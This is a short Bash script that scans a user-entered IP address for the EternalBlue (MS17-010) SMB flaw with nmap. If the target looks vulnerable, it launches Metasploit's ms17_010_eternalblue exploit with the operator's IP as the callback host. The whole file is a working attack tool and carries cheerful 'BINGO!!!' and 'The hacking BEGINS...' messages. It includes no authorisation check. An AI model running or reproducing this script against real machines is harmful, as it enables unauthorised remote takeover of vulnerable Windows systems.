#!/bin/bash
NORMAL='\033[0m'      #  ${NORMAL}    # все атрибуты по умолчанию
DGRAY='\033[1;30m'     #  ${DGRAY}
LRED='\033[1;31m'       #  ${LRED}
LGREEN='\033[1;32m'     #  ${LGREEN}
LYELLOW='\033[1;33m'     #  ${LYELLOW}
LBLUE='\033[1;34m'     #  ${LBLUE}
LMAGENTA='\033[1;35m'   #  ${LMAGENTA}
LCYAN='\033[1;36m'     #  ${LCYAN}
WHITE='\033[1;37m'     #  ${WHITE}


if ! command -v nmap &> /dev/null; then
    echo -e "$LRED Error: nmap is not installed. Please install it before using this script.$NORMAL"
    exit 1
fi

if ! command -v msfconsole &> /dev/null; then
    echo -e "$LRED Error: msfconsole is not installed. Please install it before using this script.$NORMAL"
    exit 1
fi

    output_directory="outputs"
    output_file="eternalblue_out.txt"
    
    #my_ip=$(ip addr show | grep 'inet 192' | awk '{print $2}' | cut -d'/' -f1)
    echo -e "$LYELLOW Check the target for the$NORMAL$LBLUE EternalBlue$NORMAL$LYELLOW vulnerability$NORMAL"
    echo -en "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter the target's IP address:$NORMAL "
    read target
    result=$(nmap -p 445 --script smb-vuln-ms17-010.nse $target | grep "State: VULNERABLE")

    if [ -n "$result" ]; then
        echo "                                                                                       "
        echo -e "$LGREEN BINGO!!!$NORMAL $LYELLOW$target can be hacked using EternalBlue$NORMAL" | tee "$output_directory/$output_file"
        echo "                                                                                       "
        
        while true; do
            echo -en "$LCYAN Do you want to launch an attack? (Yes/No): $NORMAL"
            read continue_input
            if [ "$continue_input" == "Yes" ]; then
                echo -en "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter your IP address:$NORMAL "
                read ip
                echo -e "$LYELLOW The hacking BEGINS...$NORMAL"
                msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $target; set processname lsass.exe; set LHOST $ip; run; exit"
                break
            elif [ "$continue_input" == "No" ]; then
                echo -e "$LCYAN See you soon =)$NORMAL"
                break 
            else
                echo -e "$LCYAN Please enter Yes or No$NORMAL"
            fi
        done
    else
        echo "                                                                                         "
        echo -e "$LRED Unlucky...$target cant be hacked using EternalBlue" | tee "$output_directory/$output_file$NORMAL"
        echo "                                                                                         "
    fi
